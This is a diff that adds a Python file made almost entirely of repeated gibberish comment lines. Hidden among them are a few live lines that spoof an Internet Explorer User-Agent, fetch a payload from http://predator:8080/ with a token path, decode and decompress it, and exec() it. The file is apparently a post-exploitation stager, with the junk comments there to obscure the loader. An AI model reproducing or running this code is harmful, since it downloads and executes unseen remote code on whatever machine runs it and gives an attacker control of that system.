@@ -1,0 +1,171 @@
+#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   
+# jdfhpokgto;h kt hkt'p k  th ; ff
+import zlib,base64,sys
+#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff
+vi=sys.version_info
+
+
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   
+ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
+#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff
+hs=[]
+o=ul.build_opener(*hs)
+#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff
+
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   
+o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
+exec(zlib.decompress(base64.b64decode(o.open('http://predator:8080/Y2hNqraVQJZiHHcIPbVtVwSDl-bI2QaWGcew-V9c9Ik5SCx0XdCDW5g1xyljZWkprHa9P3cKVMH7rjk9yJk6OPLdKMsbv').read())))
+#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff#hgfhdsjlkgjds rilogrflg jdslrjg l rojgp; r;kg;r ksge;kg p'[drt
+#ik jfbgdfkjh ;d jhodt khd khd hkdth l
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+
+# jdfhpokgto;h kt hkt'p k  th ; ff
+# jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   # jh;kgtdf/hd;hkd;r ;cl     'dfh;drlkhgd kp;d k kh 
+#jgdlkf hgl;kdf ;df kdl;f kr;olgk drg ;lrkgl;rf kjhgpdrk gsl;r gl;kf g;drk'pr 
+
+# kjhpo;dkgfl;hkdp';h kd'prh kgdl; kjnh'p;h k'drh'dk'gcxfc  d kd kd kd
+#jk l;gdkjfl;h kjg;dlh kdrh k;dkhgp;d kl;dr j;   kg;drf kjg'p   
+
